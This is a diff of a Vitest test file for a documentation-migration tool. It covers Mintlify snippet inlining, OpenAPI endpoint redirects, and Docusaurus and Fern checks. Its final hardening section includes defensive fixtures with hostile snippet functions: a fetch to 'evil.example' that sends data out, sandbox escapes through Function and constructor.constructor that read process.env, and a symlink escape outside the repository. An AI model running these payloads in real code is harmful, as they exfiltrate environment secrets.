@@ -3,7 +3,7 @@
 import { EventEmitter } from 'node:events'
 import { mkdtempSync, mkdirSync, symlinkSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
-import { join } from 'node:path'
+import { dirname, join } from 'node:path'
 
 import { afterEach, describe, expect, it, vi } from 'vitest'
 
@@ -345,6 +345,92 @@ describe('Mintlify repository migration', () => {
     expect(page?.body).not.toContain('<Snippet')
   })
 
+  it('inlines an upper-case value export imported by a single-name import (`import { API_KEY_REF } from ...`) instead of dropping the binding', () => {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-const-'))
+    mkdirSync(join(root, 'snippets'), { recursive: true })
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      $schema: 'https://mintlify.com/docs.json',
+      navigation: { pages: ['home'] },
+    }))
+    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const API_KEY_REF = '<KEY>';\n")
+    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport { API_KEY_REF } from '/snippets/constants.mdx';\n\nKey: {API_KEY_REF}\n")
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    const page = bundle.pages.find((candidate) => candidate.id === 'home')
+    expect(page?.body).toContain('export const API_KEY_REF = "<KEY>";')
+    expect(page?.body).not.toContain("constants.mdx")
+  })
+
+  it('inlines a static object-literal export imported alongside primitive values (`PDFParserEngine.MistralOCR`) instead of leaving the whole import dangling', () => {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-object-'))
+    mkdirSync(join(root, 'snippets'), { recursive: true })
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      $schema: 'https://mintlify.com/docs.json',
+      navigation: { pages: ['home'] },
+    }))
+    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const Engine = {\n  Mistral: 'mistral-ocr',\n  Native: 'native',\n};\nexport const COST = 2;\n")
+    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport {\n  COST as PRICE,\n  Engine,\n} from '/snippets/constants.mdx';\n\nEngine: {Engine.Mistral} {PRICE}\n")
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    const page = bundle.pages.find((candidate) => candidate.id === 'home')
+    expect(page?.body).toContain('export const PRICE = 2;')
+    expect(page?.body).toMatch(/export const Engine = \{[^}]*Mistral: 'mistral-ocr'/)
+    expect(page?.body).not.toContain('constants.mdx')
+  })
+
+  it('inlines a self-contained function export imported from a snippet (`getTotalFeeString(...)` used in prose)', () => {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-fn-'))
+    mkdirSync(join(root, 'snippets'), { recursive: true })
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      $schema: 'https://mintlify.com/docs.json',
+      navigation: { pages: ['home'] },
+    }))
+    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const fee = (type, value) => {\n  if (type === 'a') return '5%';\n  return String(value);\n};\n")
+    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport {\n  fee\n} from '/snippets/constants.mdx';\n\nFee {fee('a', null)}\n")
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    const page = bundle.pages.find((candidate) => candidate.id === 'home')
+    expect(page?.body).toContain("export const fee = (type, value) => {")
+    expect(page?.body).not.toContain('constants.mdx')
+    expect(bundle.warnings.some((warning) => warning.message.includes('"fee"'))).toBe(false)
+  })
+
+  it('binds an export that cannot be inlined to undefined with a warning and still inlines the others from the same import', () => {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-unresolved-'))
+    mkdirSync(join(root, 'snippets'), { recursive: true })
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      $schema: 'https://mintlify.com/docs.json',
+      navigation: { pages: ['home'] },
+    }))
+    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const compute = () => outside + 1;\nexport const FEE = '5';\nexport const Dyn = makeThing();\n")
+    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport { compute, FEE, Dyn } from '/snippets/constants.mdx';\n\n{compute()} {FEE}\n")
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    const page = bundle.pages.find((candidate) => candidate.id === 'home')
+    expect(bundle.warnings).toContainEqual(expect.objectContaining({ code: 'unsupported-config', message: expect.stringContaining('Define "compute" in the page') }))
+    expect(page?.body).toContain('export const compute = undefined;')
+    expect(page?.body).toContain('export const FEE = "5";')
+    expect(page?.body).not.toContain('constants.mdx')
+  })
+
+  it('binds a name the snippet does not export to undefined and still inlines the others from the same import', () => {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-missing-export-'))
+    mkdirSync(join(root, 'snippets'), { recursive: true })
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      $schema: 'https://mintlify.com/docs.json',
+      navigation: { pages: ['home'] },
+    }))
+    writeFileSync(join(root, 'snippets', 'constants.mdx'), "export const FEE = '5';\n")
+    writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport {\n  FEE,\n  MISSING_LIMIT,\n} from '/snippets/constants.mdx';\n\nFee {FEE}% limit {MISSING_LIMIT}.\n")
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    const page = bundle.pages.find((candidate) => candidate.id === 'home')
+    expect(page?.body).toContain('export const FEE = "5";')
+    expect(page?.body).toContain('export const MISSING_LIMIT = undefined;')
+    expect(page?.body).not.toContain('constants.mdx')
+    expect(bundle.warnings.some((warning) => warning.message.includes('"MISSING_LIMIT" is not exported') && warning.source === 'home.mdx' && warning.code === 'unsupported-config')).toBe(true)
+  })
+
   it('hoists a component snippet as a real declaration instead of splicing its source into the usage tag', () => {
     const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-component-snippet-'))
     mkdirSync(join(root, 'snippets'), { recursive: true })
@@ -383,6 +469,57 @@ describe('Mintlify repository migration', () => {
     const client = bundle.componentFiles?.find((file) => file.path.includes('/inline-'))
     expect(String(client?.content)).toContain('export const Label')
     expect(String(client?.content)).toContain('export const Counter')
+  })
+
+  describe('a snippet component used without an import', () => {
+    const project = (snippets: Record<string, string>, page = "---\ntitle: Home\n---\n\n<Template data={{ A: 'b' }}>Hello</Template>\n") => {
+      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-unimported-'))
+      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home'] } }))
+      for (const [path, content] of Object.entries(snippets)) {
+        mkdirSync(dirname(join(root, path)), { recursive: true })
+        writeFileSync(join(root, path), content)
+      }
+      writeFileSync(join(root, 'home.mdx'), page)
+      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+      return { bundle, body: bundle.pages.find((candidate) => candidate.id === 'home')!.body, messages: bundle.warnings.map((warning) => warning.message) }
+    }
+    const template = 'export const Template = ({ children, data }) => <>{children}</>\n'
+
+    it('resolves the one snippet exporting that name, keeps its props and says the live site rendered it empty', () => {
+      const { body, messages, bundle } = project({ 'snippets/exports/Template.jsx': template })
+      expect(messages).toContain('<Template> is used without an import; it was resolved to snippets/exports/Template.jsx (the only snippet exporting that name). Mintlify renders unimported components as empty, so this page now shows content the live site does not.')
+      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(false)
+      expect(body).toContain('data=')
+      expect(body).not.toContain('<div>')
+      expect(bundle.componentFiles?.some((file) => file.path.endsWith('/Template.jsx'))).toBe(true)
+    })
+
+    it('imports a default-exported component as a default import, never as a named one that would be undefined', () => {
+      const { bundle } = project({ 'snippets/Foo.jsx': 'export default function Foo() { return <b>x</b> }\n' }, '---\ntitle: Home\n---\n\n<Foo />\n')
+      const registry = String(bundle.componentFiles?.find((file) => file.path === 'src/mdx/custom-components.tsx')?.content)
+      expect(registry).toMatch(/import \{ default as Migrated[0-9a-f]+ \} from/)
+      expect(registry).not.toMatch(/import \{ Foo as/)
+    })
+
+    it('keeps the plain fallback when two snippets export the same name', () => {
+      const { body, messages } = project({ 'snippets/a/Template.jsx': template, 'snippets/b/Template.jsx': template })
+      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(true)
+      expect(messages.some((message) => message.includes('used without an import'))).toBe(false)
+      expect(body).toContain('<div>')
+    })
+
+    it('keeps the plain fallback when no snippet exports the name', () => {
+      const { messages } = project({ 'snippets/exports/Other.jsx': 'export const Other = () => null\n' })
+      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(true)
+      expect(messages.some((message) => message.includes('used without an import'))).toBe(false)
+    })
+
+    it('keeps the plain fallback when the only matching snippet is access-restricted', () => {
+      const { body, messages } = project({ 'snippets/exports/Template.jsx': `---\ngroups: [admin]\n---\n${template}` })
+      expect(messages.some((message) => message.includes('used without an import'))).toBe(false)
+      expect(messages.some((message) => message.includes('Unresolved MDX component <Template>'))).toBe(true)
+      expect(body).not.toContain('data=')
+    })
   })
 
   it('does not let a page-local component be shadowed by a same-named global snippet alias', () => {
@@ -926,7 +1063,7 @@ describe('Mintlify repository migration', () => {
       const bundle = apiFixture(pages, twoSpecNav)
       const manual = bundle.pages.find((page) => page.id === 'manual')
       expect(manual).toMatchObject({ api: 'POST https://httpbin.org/anything', authMethod: 'bearer' })
-      expect(bundle.docsConfig.api).toEqual({ mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } } })
+      expect(bundle.docsConfig.api).toEqual({ mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } }, specLink: false })
       const rendered = renderMigrationFiles(bundle).find((file) => file.path.endsWith('manual.mdx'))
       expect(String(rendered?.content)).toContain('api: "POST https://httpbin.org/anything"')
       expect(String(rendered?.content)).toContain('authMethod: "bearer"')
@@ -942,7 +1079,7 @@ describe('Mintlify repository migration', () => {
         },
         { ...twoSpecNav, api: { mdx: twoSpecNav.api.mdx, playground: { display: 'simple' } } },
       )
-      expect(bundle.docsConfig.api).toEqual({ mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } }, playground: { display: 'simple' } })
+      expect(bundle.docsConfig.api).toEqual({ mdx: { server: 'https://httpbin.org/', auth: { method: 'bearer' } }, playground: { display: 'simple' }, specLink: false })
       const page = (id: string) => bundle.pages.find((candidate) => candidate.id === id)
       expect(page('quiet')?.playground).toBe('none')
       // No viewer sign-in exists here, so Mintlify's "auth" shows no playground rather than showing it to everyone.
@@ -961,7 +1098,7 @@ describe('Mintlify repository migration', () => {
       const bad = bundle.pages.find((page) => page.id === 'bad')
       expect(bad?.api).toBeUndefined()
       expect(bad?.authMethod).toBeUndefined()
-      expect(bundle.docsConfig.api).toEqual({ mdx: { server: ['https://ok.example.com'] } })
+      expect(bundle.docsConfig.api).toEqual({ mdx: { server: ['https://ok.example.com'] }, specLink: false })
       const messages = bundle.warnings.map((w) => w.message).join('\n')
       expect(messages).toContain('"api" frontmatter')
       expect(messages).toContain('authMethod')
@@ -989,7 +1126,7 @@ describe('Mintlify repository migration', () => {
     const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
 
     const apiTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'Documentation')
-    expect(apiTab?.api).toEqual({ source: 'openapi/openapi.yaml', navigation: false })
+    expect(apiTab?.api).toEqual({ source: 'openapi/openapi.yaml' })
     expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/openapi.yaml')
     expect(bundle.warnings.some((warning) =>
       warning.message.includes('qstash/api-reference') && warning.message.includes('covers a whole tab'))).toBe(true)
@@ -1093,6 +1230,131 @@ describe('Mintlify repository migration', () => {
     expect(guide?.body).not.toContain('/qstash/api-reference/messages/publish-a-message')
   })
 
+  it('keeps generated endpoint navigation for a `directory` spec beside authored groups and redirects Mintlify endpoint URLs', () => {
+    const root = fixture()
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      navigation: {
+        tabs: [{
+          tab: 'API Reference',
+          groups: [{ group: 'API Guides', pages: ['guide'] }],
+          openapi: { source: 'openapi/openapi.yaml', directory: 'api/api-reference' },
+        }],
+      },
+    }))
+    mkdirSync(join(root, 'openapi'), { recursive: true })
+    writeFileSync(join(root, 'openapi', 'openapi.yaml'), [
+      'openapi: 3.1.0',
+      'info: { title: Svc, version: "1.0" }',
+      'paths:',
+      '  /interns/{id}/access:',
+      '    get:',
+      '      summary: Get an intern\'s daemon access',
+      '      tags: [alpha.decisions]',
+      '      responses: { "200": { description: ok } }',
+      '  /generation:',
+      '    get:',
+      '      summary: Get request & usage metadata for a generation',
+      '      tags: [Generations]',
+      '      responses: { "200": { description: ok } }',
+    ].join('\n'))
+    writeFileSync(join(root, 'guide.mdx'), [
+      '---',
+      'title: Guide',
+      '---',
+      '',
+      'See [access](/api/api-reference/alphadecisions/get-an-interns-daemon-access).',
+    ].join('\n'))
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+
+    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'API Reference')
+    expect(apiTab?.groups).toEqual([{ group: 'API Guides', pages: ['guide'] }])
+    expect(apiTab?.api).toEqual({ source: 'openapi/openapi.yaml' })
+    expect(bundle.pages.find((page) => page.id === 'guide')?.body)
+      .toContain('[access](/api/default/interns/id/access/get)')
+    expect(bundle.docsConfig.redirects).toEqual(expect.arrayContaining([
+      { source: '/api/api-reference/alphadecisions/get-an-interns-daemon-access', destination: '/api/default/interns/id/access/get' },
+      { source: '/api/api-reference/generations/get-request-&-usage-metadata-for-a-generation', destination: '/api/default/generation/get' },
+    ]))
+  })
+
+  it('falls back to operationId, then method and path, when an operation summary is empty', () => {
+    const root = fixture()
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      navigation: { tabs: [{ tab: 'API', openapi: { source: 'e.yaml', directory: 'api' } }] },
+    }))
+    writeFileSync(join(root, 'e.yaml'), [
+      'openapi: 3.1.0', 'info: { title: E, version: "1.0" }', 'paths:',
+      '  /a:', '    get:', '      summary: ""', '      operationId: listThings', '      tags: [T]', '      responses: { "200": { description: ok } }',
+      '  /b:', '    get:', '      summary: "   "', '      tags: [T]', '      responses: { "200": { description: ok } }',
+    ].join('\n'))
+    const sources = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' }).docsConfig.redirects?.map((redirect) => redirect.source) ?? []
+    expect(sources).toContain('/api/t/listthings')
+    expect(sources).toContain('/api/t/get-b')
+  })
+
+  it('keeps the first operation and warns when two operations in a tag share a Mintlify endpoint slug', () => {
+    const root = fixture()
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      navigation: { tabs: [{ tab: 'API', openapi: { source: 'd.yaml', directory: 'api' } }] },
+    }))
+    writeFileSync(join(root, 'd.yaml'), [
+      'openapi: 3.1.0', 'info: { title: D, version: "1.0" }', 'paths:',
+      '  /a:', '    get:', '      summary: Get thing', '      tags: [T]', '      responses: { "200": { description: ok } }',
+      '  /b:', '    get:', '      summary: Get thing', '      tags: [T]', '      responses: { "200": { description: ok } }',
+    ].join('\n'))
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    expect(bundle.docsConfig.redirects?.filter((redirect) => redirect.source === '/api/t/get-thing')).toEqual([
+      { source: '/api/t/get-thing', destination: '/api/default/a/get' },
+    ])
+    expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('shared by more than one operation')
+    expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('/api/t/get-thing')
+  })
+
+  it('redirects a bare Mintlify tag URL to the first operation of that tag and rewrites body links to it', () => {
+    const root = fixture()
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      navigation: { tabs: [{ tab: 'API', openapi: { source: 't.yaml', directory: 'api' } }, { tab: 'Docs', pages: ['index'] }] },
+    }))
+    writeFileSync(join(root, 'index.mdx'), '---\ntitle: Home\n---\n\nSee [BYOK](/api/byok).')
+    writeFileSync(join(root, 't.yaml'), [
+      'openapi: 3.1.0', 'info: { title: T, version: "1.0" }', 'paths:',
+      '  /byok:', '    get:', '      summary: List credentials', '      tags: [BYOK]', '      responses: { "200": { description: ok } }',
+      '    post:', '      summary: Create a credential', '      tags: [BYOK]', '      responses: { "200": { description: ok } }',
+    ].join('\n'))
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/api/byok', destination: '/api/default/byok/get' })
+    expect(bundle.pages.map((page) => page.body).join('\n')).toContain('(/api/default/byok/get)')
+  })
+
+  it('counts endpoint redirects skipped because a page already owns the URL', () => {
+    const root = fixture()
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      navigation: { tabs: [{ tab: 'API', openapi: { source: 'o.yaml', directory: 'api' } }, { tab: 'Docs', pages: ['api/t/get-one'] }] },
+    }))
+    mkdirSync(join(root, 'api', 't'), { recursive: true })
+    writeFileSync(join(root, 'api', 't', 'get-one.mdx'), '---\ntitle: Own page\n---\n\nBody.')
+    writeFileSync(join(root, 'o.yaml'), [
+      'openapi: 3.1.0', 'info: { title: O, version: "1.0" }', 'paths:',
+      '  /a:', '    get:', '      summary: Get one', '      tags: [T]', '      responses: { "200": { description: ok } }',
+      '  /b:', '    get:', '      summary: Get two', '      tags: [T]', '      responses: { "200": { description: ok } }',
+    ].join('\n'))
+    const messages = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' }).warnings.map((warning) => warning.message).join('\n')
+    expect(messages).toContain('Created 2 of 3 Mintlify endpoint redirects; skipped 1: 1 because the URL already has a page or redirect')
+  })
+
+  it('caps generated Mintlify endpoint redirects and warns how many were not created', () => {
+    const root = fixture()
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      navigation: { tabs: [{ tab: 'API', openapi: { source: 'big.yaml', directory: 'api' } }] },
+    }))
+    const paths = Array.from({ length: 2_050 }, (_, index) => `  /op${index}:\n    get:\n      summary: Op ${index}\n      tags: [T]\n      responses: { "200": { description: ok } }`)
+    writeFileSync(join(root, 'big.yaml'), ['openapi: 3.1.0', 'info: { title: Big, version: "1.0" }', 'paths:', ...paths].join('\n'))
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    expect(bundle.docsConfig.redirects?.filter((redirect) => redirect.source.startsWith('/api/t'))).toHaveLength(2_000)
+    expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('Created 2000 of 2051 Mintlify endpoint redirects; skipped 51: 51 because a site is limited to 2000')
+  })
+
   it('drops a manual OpenAPI operation listing ("GET /path") with one warning instead of one missing-page warning per operation', () => {
     const root = fixture()
     writeFileSync(join(root, 'docs.json'), JSON.stringify({
@@ -1177,7 +1439,7 @@ describe('Mintlify repository migration', () => {
     writeFileSync(join(root, 'agent-context', 'notes.mdx'), '# Internal notes')
     writeFileSync(join(root, '.mintignore'), 'agent-context/\n')
     // Invalid MDX (an unmatched closing tag) must not abort the whole import.
-    writeFileSync(join(root, 'en', 'broken.mdx'), '---\ntitle: Broken\n---\n\n</NoOpenTag>')
+    writeFileSync(join(root, 'en', 'broken.mdx'), '---\ntitle: Broken\n---\n\n{unclosed')
 
     const bundle = migrateRepository({
       repositoryDir: root,
@@ -1191,6 +1453,29 @@ describe('Mintlify repository migration', () => {
       code: 'skipped-file',
       source: 'en/broken.mdx',
       message: expect.stringContaining('does not compile as MDX'),
+    }))
+  })
+
+  it('excludes a page that re-exports from a relative module the migration does not ship, but keeps relative snippet imports', () => {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-module-'))
+    mkdirSync(join(root, 'snippets'))
+    mkdirSync(join(root, 'legal'))
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({
+      $schema: 'https://mintlify.com/docs.json',
+      navigation: { pages: ['legal/terms', 'guide'] },
+    }))
+    writeFileSync(join(root, 'snippets/widget.jsx'), 'export const Widget = () => <div>Hi</div>\n')
+    writeFileSync(join(root, 'legal/terms.mdx'), "---\ntitle: Terms\n---\n\nexport { metadata } from './metadata';\n\nTerms text.\n")
+    writeFileSync(join(root, 'guide.mdx'), "---\ntitle: Guide\n---\n\nimport { Widget } from './snippets/widget.jsx'\n\n<Widget />\n")
+
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+
+    expect(bundle.pages.map((page) => page.id)).not.toContain('legal/terms')
+    expect(bundle.pages.map((page) => page.id)).toContain('guide')
+    expect(bundle.warnings).toContainEqual(expect.objectContaining({
+      code: 'skipped-file',
+      source: 'legal/terms.mdx',
+      message: expect.stringContaining('"./metadata"'),
     }))
   })
 
@@ -1400,8 +1685,8 @@ describe('Mintlify repository migration', () => {
 
   it('keeps (but warns on) a page that passes a function to a built-in this migration cannot confirm is a client component', () => {
     const root = fixture()
-    // `Steps` is a Thally runtime built-in that renders entirely on the
-    // server (`src/components/mdx/steps.tsx` has no 'use client'), and it is
+    // `Card` is a Thally runtime built-in that renders entirely on the
+    // server (`src/components/mdx/content-cards.tsx` has no 'use client'), and it is
     // not something this migration copied or extracted either — neither
     // `EXTRACTED_CLIENT_COMPONENT_TAG` nor `CLIENT_BUILTIN_COMPONENT_TAGS`
     // matches it, so exclusion (a last resort) does not apply; the page is
@@ -1414,7 +1699,7 @@ describe('Mintlify repository migration', () => {
       '',
       'export const CustomBlock = ({ children }) => <div>{children}</div>;',
       '',
-      '<Steps title="x" RenderComponent={CustomBlock}>Body</Steps>',
+      '<Card title="x" RenderComponent={CustomBlock}>Body</Card>',
     ].join('\n'))
 
     const bundle = migrateRepository({
@@ -1470,7 +1755,7 @@ describe('Mintlify repository migration', () => {
   it('keeps a page where a string const feeds a client built-in while a function feeds an unconfirmed one, on the same page', () => {
     // Reviewer's exact input: `diagram` (a plain string) is not a function at
     // all, so `Mermaid chart={diagram}` never enters the check; `Demo` (a
-    // real function) targets `Steps`, which is not a confirmed client
+    // real function) targets `Card`, which is not a confirmed client
     // boundary, so the page is kept with a warning, not excluded.
     const root = fixture()
     writeFileSync(join(root, 'en', 'value-and-function.mdx'), [
@@ -1481,7 +1766,7 @@ describe('Mintlify repository migration', () => {
       'export const Demo = ({ children }) => <div>{children}</div>;',
       "export const diagram = 'graph TD; A-->B';",
       '',
-      '<Steps render={Demo}>x</Steps>',
+      '<Card render={Demo}>x</Card>',
       '',
       '<Mermaid chart={diagram} />',
     ].join('\n'))
@@ -2036,6 +2321,7 @@ describe('Docusaurus repository migration', () => {
     expect(body.indexOf('Before cards.')).toBeLessThan(body.indexOf('<CardGroup>'))
     expect(body.indexOf('<CardGroup>')).toBeLessThan(body.indexOf('After cards.'))
     expect(body).not.toContain('data-thally-doc-card-list')
+    expect(bundle.docsConfig.api?.specLink).toBeUndefined()
   })
 
   it('hoists index-only folders into authored sidebar order', () => {
@@ -2772,6 +3058,7 @@ describe('Fern repository migration', () => {
     expect(bundle.pages.find((page) => page.title === 'A Longer Page Title')?.navTitle).toBe('Overview')
     expect(bundle.pages.find((page) => page.title === 'Legacy page')?.hidden).toBe(true)
     expect(JSON.stringify(bundle.docsConfig.tabs)).not.toContain('legacy')
+    expect(bundle.docsConfig.api?.specLink).toBeUndefined()
   })
 
   it('preserves Fern announcements, external tabs, and logo suffixes', () => {
@@ -4339,3 +4626,183 @@ describe('cloneGitHubRepository retry', () => {
     expect(cloneOutcomes.queue).toHaveLength(0)
   })
 })
+
+describe('Mintlify snippet inlining hardening', () => {
+  function snippetFixture(files: Record<string, string>, body: string, home = 'home') {
+    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-hardening-'))
+    writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: [home] } }))
+    for (const [path, content] of Object.entries(files)) {
+      mkdirSync(dirname(join(root, path)), { recursive: true })
+      writeFileSync(join(root, path), content)
+    }
+    writeFileSync(join(root, `${home}.mdx`), `---\ntitle: Home\n---\n\n${body}\n`)
+    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+    return { root, page: bundle.pages.find((candidate) => candidate.id === home), warnings: bundle.warnings }
+  }
+
+  it('recognises a $-prefixed export and lists, and does not slow down on adversarial export lists', () => {
+    const { page, warnings } = snippetFixture({
+      'snippets/c.mdx': "import q from 'q';\nexport const $x = q.z;\nconst b = 1;\nexport { b };\n",
+    }, "import { $x, b } from '/snippets/c.mdx';\n\nV {$x} {b}")
+    expect(warnings.some((warning) => warning.message.includes('is not exported'))).toBe(false)
+    // Both are real exports, so they are reported as not inlinable (they read
+    // an import), never as missing.
+    expect(warnings.filter((warning) => warning.message.includes('could not be inlined')).map((warning) => warning.message.match(/"([^"]+)"/)?.[1]).sort()).toEqual(['$x', 'b'])
+
+    const start = performance.now()
+    snippetFixture({ 'snippets/c.mdx': 'export { a, '.repeat(5000) }, "import { q } from '/snippets/c.mdx';\n\nV {q}")
+    expect(performance.now() - start).toBeLessThan(1000)
+  })
+
+  it('does not inline a function that can reach Function, globals or the network, but keeps pure helpers', () => {
+    const files = {
+      'snippets/c.mdx': [
+        "export const viaFunction = () => Function('return process')().env;",
+        "export const viaGlobal = () => globalThis.process.env;",
+        "export const viaFetch = (x) => fetch('https://evil.example/?d=' + x);",
+        "export const viaCtor = () => ({}).constructor.constructor('return process')();",
+        "export const viaKey = (k) => ({})[k][k]('return process')();",
+        "export const fee = (type, value) => { if (type === 'a') return '5%'; return String(Math.round(Number(value))); };",
+        '',
+      ].join('\n'),
+    }
+    const safe = snippetFixture(files, "import { fee } from '/snippets/c.mdx';\n\n{fee('a', 1)}")
+    expect(safe.page?.body).toContain('export const fee = ')
+    for (const name of ['viaFunction', 'viaGlobal', 'viaFetch', 'viaCtor', 'viaKey']) {
+      const { page, warnings } = snippetFixture(files, `import { ${name} } from '/snippets/c.mdx';\n\n{${name}()}`)
+      expect(page?.body).toContain(`export const ${name} = undefined;`)
+      expect(page?.body).not.toContain('return process')
+      expect(warnings.some((warning) => warning.message.includes(`"${name}"`) && warning.message.includes('could not be inlined'))).toBe(true)
+    }
+  })
+
+  it('treats a symlinked snippets directory that points outside the repository as missing', () => {
+    const outside = mkdtempSync(join(tmpdir(), 'thally-migrate-outside-'))
+    writeFileSync(join(outside, 's.mdx'), "export const SECRET = 'leaked-value';\nexport const Box = () => <b>leaked-component</b>;\n")
+    const imports = [
+      "import { SECRET } from '/snippets/s.mdx';\n\nV {SECRET}",
+      "import { Box } from '/snippets/s.mdx';\n\n<Box />",
+      '<Snippet file="s.mdx" />',
+    ]
+    for (const body of imports) {
+      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-symlink-snippets-'))
+      symlinkSync(outside, join(root, 'snippets'))
+      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home'] } }))
+      writeFileSync(join(root, 'home.mdx'), `---\ntitle: Home\n---\n\n${body}\n`)
+      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+      const page = bundle.pages.find((candidate) => candidate.id === 'home')
+      expect(page?.body ?? '').not.toContain('leaked')
+      expect(bundle.warnings.some((warning) => warning.source === 'home.mdx' && /s\.mdx/.test(warning.message))).toBe(true)
+      expect(bundle.warnings.some((warning) => warning.source === 'home.mdx' && warning.code === 'skipped-file')).toBe(false)
+    }
+  })
+
+  it('excludes a page whose dynamic import() uses a relative module the migration does not ship', () => {
+    const files = { 'lib/m.ts': 'export const m = 1\n' }
+    for (const body of [
+      "export const load = () => import('./lib/missing')\n\nText.",
+      "{import('./lib/missing')}\n\nText.",
+      "<Card title={String(import('./lib/missing'))}>Text.</Card>",
+    ]) {
+      // The only page is excluded, so the migration reports why and stops.
+      expect(() => snippetFixture(files, body)).toThrow(/imports "\.\/lib\/missing"/)
+    }
+    expect(snippetFixture(files, '<Card title="import(\'./lib/m\')">Text.</Card>').page).toBeDefined()
+  })
+
+  describe('relative imports of files the migration ships', () => {
+    const shipped = {
+      'comp.jsx': 'export default function Comp() { return <b>x</b> }\nexport const Named = () => <i>n</i>\n',
+      'lib/m.ts': 'export const m = 1\n',
+      'styles.css': 'a { color: red }\n',
+      'setup.js': 'globalThis.ready = true\n',
+    }
+    function keptPage(body: string, files: Record<string, string> = shipped) {
+      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-kept-'))
+      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home', 'other'] } }))
+      for (const [path, content] of Object.entries(files)) {
+        mkdirSync(dirname(join(root, path)), { recursive: true })
+        writeFileSync(join(root, path), content)
+      }
+      writeFileSync(join(root, 'home.mdx'), `---\ntitle: Home\n---\n\n${body}\n`)
+      writeFileSync(join(root, 'other.mdx'), '---\ntitle: Other\n---\n\nHi\n')
+      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+      return { page: bundle.pages.find((candidate) => candidate.id === 'home'), warnings: bundle.warnings.filter((warning) => warning.source === 'home.mdx') }
+    }
+
+    it('strips a relative side-effect import with a warning and keeps the page', () => {
+      for (const specifier of ['./styles.css', './setup.js', './missing.js']) {
+        const { page, warnings } = keptPage(`import '${specifier}'\n\nText.`)
+        expect(page?.body).not.toContain(specifier)
+        expect(warnings).toContainEqual(expect.objectContaining({ code: 'unsupported-config', message: expect.stringContaining(`side-effect import of "${specifier}"`) }))
+        expect(warnings.some((warning) => warning.code === 'skipped-file' || /was preserved/.test(warning.message))).toBe(false)
